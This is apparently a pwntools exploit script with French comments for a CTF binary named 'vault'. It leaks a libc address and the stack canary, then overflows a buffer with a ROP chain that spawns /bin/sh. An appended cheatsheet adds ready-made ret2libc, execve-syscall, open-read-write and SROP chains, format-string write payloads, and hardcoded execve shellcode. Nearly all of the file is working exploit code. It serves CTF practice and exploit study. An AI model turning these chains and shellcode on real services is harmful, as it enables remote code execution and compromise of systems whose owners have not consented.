#!/usr/bin/env python3

from pwn import *
import argparse, re

# Config (généré par pwninit)
elf = ELF("./vault_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.os = "linux"  # linux, windows, freebsd, android
context.log_level = "debug"  # debug, info, warning, error, critical, notset
context.arch      = 'amd64' # i386,amd64,arm,aarch64,mips,mips64,powerpc,powerpc64,sparc,sparc64,riscv
context.terminal = ["tmux", "splitw", "-v", "-p", "80"]

HOST, PORT = "host", 0
OFFSET = 0

GDBSCRIPT = """
    source /opt/tools/gdb/pwndbg/gdbinit.py
    #b *main
    b *vuln+97
    c
"""

# Argparse
parser = argparse.ArgumentParser(description="Pwntools exploit template")
parser.add_argument("--local", action="store_true", help="Run locally")
parser.add_argument("--debug", action="store_true", help="Attach GDB")
parser.add_argument("--remote", action="store_true", help="Force remote")
parser.add_argument("--no-aslr", action="store_true", help="Disable ASLR (local only)")
parser.add_argument(
    "--host",
    metavar="HOST",
    default=None,
    help="Remote host (overrides HOST in script)",
)
parser.add_argument(
    "--port",
    metavar="PORT",
    type=int,
    default=None,
    help="Remote port (overrides PORT)",
)
args = parser.parse_args()


# Connexion. Modes :
#   (défaut) process local     --debug  local sous GDB     --no-aslr  local, ASLR désactivé
#   --remote (ou HOST défini)  cible distante ; override à la volée avec --host/--port
def start():
    host = args.host or HOST
    port = args.port or PORT
    if args.remote or (not args.local and host != "host"):
        if host == "host":
            log.error(
                "Remote requested but no host set: edit HOST/PORT or pass --host/--port"
            )
        return remote(host, port, ssl=False)
    if args.debug:
        return gdb.debug([elf.path], gdbscript=GDBSCRIPT)
    if args.no_aslr:
        return process([elf.path], aslr=False)
    return process([elf.path])


# =========================
# Helpers
# =========================
# Raccourcis I/O - chacun encode automatiquement str/int en bytes via _b() :
#   s(x)    envoie                    sl(x)     envoie + newline
#   sa(d,x) envoie après avoir vu d   sla(d,x)  envoie + newline après avoir vu d
#   ru(x)   lit jusqu'à x             rn(n)     lit exactement n octets
#   rl()    lit une ligne             rc(x)     lit la ligne contenant x
#   rall()  lit jusqu'à EOF           clean()   vide/renvoie le buffer en attente
# Tous transmettent les kwargs pwntools a la methode sous-jacente :
#   sla(b'> ', b'x', timeout=3)   ru(b'? ', drop=True)   rl(keepends=False)
def _b(x):
    return x if isinstance(x, bytes) else str(x).encode()


def s(x, **kw):
    io.send(_b(x), **kw)


def sl(x, **kw):
    io.sendline(_b(x), **kw)


def sa(d, x, **kw):
    io.sendafter(_b(d), _b(x), **kw)


def sla(d, x, **kw):
    io.sendlineafter(_b(d), _b(x), **kw)


def ru(x, **kw):
    return io.recvuntil(_b(x), **kw)


def rn(n, **kw):
    return io.recvn(n, **kw)


def rl(**kw):
    return io.recvline(**kw)


def rc(x, **kw):
    return io.recvline_contains(_b(x), **kw)


def rall(**kw):
    return io.recvall(**kw)


def clean(**kw):
    return io.clean(**kw)


# leak_hex_int(output, with_prefix=False) : extrait les entiers hexa de la sortie brute.
#   with_prefix=True  -> seulement les valeurs préfixées 0x ; False -> mots hexa bruts (>= 4 chiffres).
#   ex: addrs = leak_hex_int(rl())   ->   [0x7ffff7a...]
def leak_hex_int(output, with_prefix=False):
    # les doubles accolades { } gardent la regex littérale à travers le .format() de pwninit
    pattern = (
        rb"0x[0-9a-fA-F]{4,}\b" if with_prefix else rb"\b(?<!0x)[0-9a-fA-F]{4,}\b"
    )
    return [int(m, 16) for m in re.findall(pattern, output)]


# decode_leaks(leaks) : affiche chaque entier leaké en texte little/big-endian + hex brut,
# pratique pour repérer de l'ASCII caché dans un leak.
#   ex: decode_leaks(leak_hex_int(rall()))
def decode_leaks(leaks):
    def to_printable(b):
        text = b.decode(errors="ignore")
        return "".join(c for c in text if c.isprintable()) or None

    for i, val in enumerate(leaks):
        size = (val.bit_length() + 7) // 8 or 1
        # doubles accolades partout pour échapper le parsing f-string de pwninit
        info(f"--- leak[{i}] {hex(val)} ---")
        for order in ("little", "big"):
            try:
                decoded = to_printable(val.to_bytes(size, order))
                info(
                    f"  {order:6}: '{decoded}'"
                    if decoded
                    else f"  {order:6}: (not printable)"
                )
            except Exception:
                info(f"  {order:6}: (failed)")
        info(f"  raw hex: {val.to_bytes(size, 'big').hex(' ')}")


# offset_browser(max_offset, marker, fmt, prompt, reconnect) : brute-force l'index d'argument d'un format string.
# Envoie marker + %N$fmt pour N de 1 à max_offset et signale le N qui renvoie le marker en écho.
# prompt = ce qu'on attend avant d'envoyer (transmis a ru) ; chaque reponse brute est aussi affichee.
#   ex: offset_browser(30, marker=b'A'*8, fmt='p', prompt=b'> ')  (reconnect=True si le binaire quitte a chaque essai)
def offset_browser(
    max_offset=30, marker=b"A" * 8, fmt="p", prompt=b"? ", reconnect=False
):
    global io
    for i in range(1, max_offset + 1):
        if reconnect:
            io = start()
        try:
            ru(prompt)
            # encore des doubles accolades pour pwninit
            sl(f"{marker.decode()}%{i}${fmt}")
            out = rl()
            print(out)
            info(f"[{i}] {out.decode().strip()}")
            if b"0x41414141" in out or b"0x4141414141414141" in out:
                success(f"Offset found: {i}")
                if reconnect:
                    io.close()
                break
        except EOFError:
            warning(f"EOF at offset {i}")
            if not reconnect:
                break
        finally:
            if reconnect:
                try:
                    io.close()
                except:
                    pass


# build_rop_chain(addrs) : empaquette une liste d'adresses en chaîne ROP p64 (bytes).
#   ex: chain = build_rop_chain([pop_rdi, bin_sh, system])
def build_rop_chain(address_list):
    return b"".join(p64(a) for a in address_list)


# find_flag(data, prefix=None) : cherche dans la sortie (bytes/str) un flag de type CTF et l'affiche.
# Sans prefix : n'importe quel mot{...}. Avec prefix : seulement ce format ; le { final est optionnel,
# donc 'CTF', 'CTF{', 'sigpwny' et 'sigpwny{' marchent tous. Renvoie les bytes du flag ou None (ne lève jamais d'erreur).
#   ex: find_flag(rall())            -> premier mot{...} trouvé
#       find_flag(clean(), 'CTF')    -> premier CTF{...}
def find_flag(data, prefix=None):
    if prefix:
        # retire le { final s'il est présent, puis échappe le prefix pour la regex
        pat = re.escape(_b(prefix).rstrip(b"{")) + rb"\{[^}]*\}"
    else:
        pat = rb"\w+\{[^}]*\}"
    m = re.search(pat, _b(data))
    if m:
        success(f"Flag found: {m.group().decode()}")
    return m.group() if m else None


# =========================
# Main


def main():
    global io
    io = start()

    # ===== Tour 1 : fuite LIBC (8 octets seulement) =====
    sa(b"name: ", b"A"*8)                 # 8 octets -> buffer+0x08 (ptr libc) intact
    ru(b"Hello, " + b"A"*8)
    leak = u64(rl().rstrip(b"\n").ljust(8, b"\x00"))      # &_IO_2_1_stdout_ (6 octets utiles)
    libc.address = leak - libc.sym["_IO_2_1_stdout_"]     # rebase la libc
    log.success(f"leak      = {hex(leak)}")
    log.success(f"libc base = {hex(libc.address)}")

    # read2 inoffensif : <= 72 octets -> on NE touche PAS au canari -> vuln revient, main reboucle
    sa(b"keeper: ", b"X"*8)

    # ===== Tour 2 : fuite CANARI (73 octets) =====
    sa(b"name: ", b"A"*72 + b"\x01")
    raw = rl()
    off = raw.index(b"Hello, ") + len("Hello, ") + 72
    canary = u64(b"\x00" + raw[off+1:off+8])
    log.success(f"canary    = {hex(canary)}")

    # ===== Tour 2 read2 : overflow -> ROP ici =====
    
    
    rop = ROP([elf, libc])
    ret     = rop.find_gadget(['ret'])[0]                 # alignement de pile (movaps)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
    pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
    pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
    bin_sh_libc = next(libc.search(b"/bin/sh\x00"))       # ... ou dans la libc
    system = libc.sym['system']
    syscall = next(libc.search(asm("syscall ; ret")))   # après libc.address fixé

    rop_chain_1 = build_rop_chain([ret, pop_rdi, bin_sh_libc, system])
    rop_chain_2 = build_rop_chain([pop_rdi, bin_sh_libc, pop_rsi, 0, pop_rdx, 0, pop_rax, 59, syscall])
    payload = b"A"*72 + p64(canary) + b"R"*8 + rop_chain_1 #p64(0xdeadbeef) 
    sl(payload)
    ...
    io.interactive()


"""

# =========================
# CHEATSHEET (référence, non exécuté) - copie/colle ce dont tu as besoin
# =========================
# pwninit lie : exe (le binaire du chall), libc, ld.

# --- RECON ---
offset_browser(30, marker=b'A'*8, fmt='p')            # index d'arg d'un format string
# BOF : envoie cyclic(200), récupère la valeur au crash, puis :
offset = cyclic_find(0x6161616c)                      # -> offset avant RIP
puts_got  = exe.got['puts']                           # GOT / PLT / symboles
puts_plt  = exe.plt['puts']
main_addr = exe.sym['main']

# --- GADGETS ---
rop = ROP(exe)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]                 # alignement de pile (movaps)
bin_sh_exe  = next(exe.search(b"/bin/sh\x00"))        # /bin/sh dans le binaire...
bin_sh_libc = next(libc.search(b"/bin/sh\x00"))       # ... ou dans la libc

# --- ROP (chaînes préfaites avec build_rop_chain ; envoi : sla(b'? ', b'A'*OFFSET + rop_chain)) ---
# gadgets en plus au besoin : pop_rsi, pop_rdx, pop_rax, syscall = rop.find_gadget([...])[0]
# 1) ret2libc : system("/bin/sh")  (le 'ret' en tête réaligne la pile pour movaps)
rop_chain = build_rop_chain([ret, pop_rdi, bin_sh_libc, system])
# 2) execve("/bin/sh", 0, 0) via syscall : rax=59, rdi=binsh, rsi=0, rdx=0
rop_chain = build_rop_chain([pop_rdi, bin_sh_libc, pop_rsi, 0, pop_rdx, 0, pop_rax, 59, syscall])
# 3) leak libc : puts(puts@got) puis retour à main pour rejouer le payload avec les adresses réelles
rop_chain = build_rop_chain([ret, pop_rdi, exe.got['puts'], exe.plt['puts'], exe.sym['main']])
# 4) ORW sans shell (seccomp) : open("flag.txt") -> read(fd=3, buf, n) -> write(1, buf, n)
#    flag_path / buf = adresses que tu contrôles (ex. .bss) ; écris d'abord "flag.txt\0" dans flag_path
rop_chain  = build_rop_chain([pop_rdi, flag_path, pop_rsi, 0, pop_rax, 2, syscall])            # open
rop_chain += build_rop_chain([pop_rdi, 3, pop_rsi, buf, pop_rdx, 0x50, pop_rax, 0, syscall])   # read
rop_chain += build_rop_chain([pop_rdi, 1, pop_rsi, buf, pop_rdx, 0x50, pop_rax, 1, syscall])   # write

# --- FORMAT STRING ---
# écriture arbitraire : dict {adresse: valeur} ; OFFSET vient d'offset_browser
payload = fmtstr_payload(OFFSET, {where_to_write: what_to_write}, write_size='byte')
log.info(f"{len(payload) = }")

# --- RET2LIBC (leak libc puis system('/bin/sh')) ---
# 1) fuite : puts(puts@got) puis retour a main pour reboucler
leak_chain = flat(ret, pop_rdi, exe.got['puts'], exe.plt['puts'], exe.sym['main'])
# sla(b'? ', flat({OFFSET: leak_chain}))            # envoie l'overflow
leak = u64(rl().strip().ljust(8, b'\x00'))            # parse le leak (6 octets -> 8)
libc.address = leak - libc.sym[sym]                   # rebase la libc
# 2) shell
system = libc.sym['system']
binsh  = next(libc.search(b'/bin/sh\x00'))
pop_chain = flat(ret, pop_rdi, binsh, system)
# alt one_gadget (sans system) : one = libc.address + 0xXXXXX ; flat(pad..., one)

# --- SHELLCODE (ret2shellcode / jmp rsp / buffer rwx) ---
shellcode = asm(shellcraft.sh())                      # généré selon context.arch
# ... ou en dur (execve /bin/sh, x86-64) :
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

# --- SYSCALL / SROP ---
# execve('/bin/sh', 0, 0) : rax=59, rdi=binsh, rsi=0, rdx=0
syscall_chain = flat(pop_rax, 59, pop_rdi, binsh, pop_rsi, 0, pop_rdx, 0, syscall)
# SROP : frame = SigreturnFrame(); frame.rax=59; frame.rdi=binsh; frame.rsi=0; frame.rdx=0; frame.rip=syscall
# payload = flat({OFFSET: [pop_rax, 15, syscall, bytes(frame)]})

"""

# Entry point
if __name__ == "__main__":
    # Usage : ./pwny.py --local [--debug] [--no-aslr]
    #         ./pwny.py --remote
    main()
